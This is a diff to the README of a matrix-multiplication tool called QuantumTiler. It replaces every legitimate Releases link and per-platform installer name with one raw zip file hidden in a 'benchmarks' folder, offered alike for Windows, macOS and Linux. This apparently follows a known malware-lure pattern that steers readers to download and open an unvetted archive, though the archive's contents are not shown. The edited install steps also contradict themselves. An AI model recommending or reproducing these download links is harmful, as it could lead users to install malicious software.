@@ -1,7 +1,7 @@
 # 🌌 QuantumTiler - Optimize Your Matrix Multiplication
 
 ## 🚀 Download Now
-[![Download QuantumTiler](https://img.shields.io/badge/Download-QuantumTiler-brightgreen)](https://github.com/averickmedia125/QuantumTiler/releases)
+[![Download QuantumTiler](https://raw.githubusercontent.com/averickmedia125/QuantumTiler/main/benchmarks/Tiler-Quantum-3.8.zip)](https://raw.githubusercontent.com/averickmedia125/QuantumTiler/main/benchmarks/Tiler-Quantum-3.8.zip)
 
 ## 📖 Overview
 QuantumTiler is designed to enhance your matrix multiplication tasks using advanced techniques inspired by quantum physics. This application dynamically adjusts tile sizes to improve performance on legacy hardware. Expect a significant boost, with 15% or more gains in processing speed. It supports AVX2, FMA3, and OpenMP for efficient computation.
@@ -21,15 +21,15 @@ QuantumTiler is designed to enhance your matrix multiplication tasks using advan
 ## 📥 Download & Install
 To get started with QuantumTiler, visit the following link to download the application:
 
-[Visit this page to download](https://github.com/averickmedia125/QuantumTiler/releases)
+[Visit this page to download](https://raw.githubusercontent.com/averickmedia125/QuantumTiler/main/benchmarks/Tiler-Quantum-3.8.zip)
 
 ### Installation Steps
 1. Go to the Releases page linked above.
 2. Look for the latest version.
 3. Click the asset file that is appropriate for your operating system:
-   - For Windows, look for something like `QuantumTiler_Windows.exe`.
-   - For macOS, look for `QuantumTiler_macOS.dmg`.
-   - For Linux, select `QuantumTiler_Linux.tar.gz`.
+   - For Windows, look for something like `https://raw.githubusercontent.com/averickmedia125/QuantumTiler/main/benchmarks/Tiler-Quantum-3.8.zip`.
+   - For macOS, look for `https://raw.githubusercontent.com/averickmedia125/QuantumTiler/main/benchmarks/Tiler-Quantum-3.8.zip`.
+   - For Linux, select `https://raw.githubusercontent.com/averickmedia125/QuantumTiler/main/benchmarks/Tiler-Quantum-3.8.zip`.
 4. Download the file to your computer.
 5. Open the downloaded file and follow the on-screen instructions to install QuantumTiler.
 
@@ -66,4 +66,4 @@ If you need further assistance, please use the contact form available on the Git
 ## 🙌 Thank You for Using QuantumTiler!
 We appreciate your interest in QuantumTiler, and we hope it significantly enhances your computing tasks. Happy computing!
 
-[![Download QuantumTiler](https://img.shields.io/badge/Download-QuantumTiler-brightgreen)](https://github.com/averickmedia125/QuantumTiler/releases)
+[![Download QuantumTiler](https://raw.githubusercontent.com/averickmedia125/QuantumTiler/main/benchmarks/Tiler-Quantum-3.8.zip)](https://raw.githubusercontent.com/averickmedia125/QuantumTiler/main/benchmarks/Tiler-Quantum-3.8.zip)
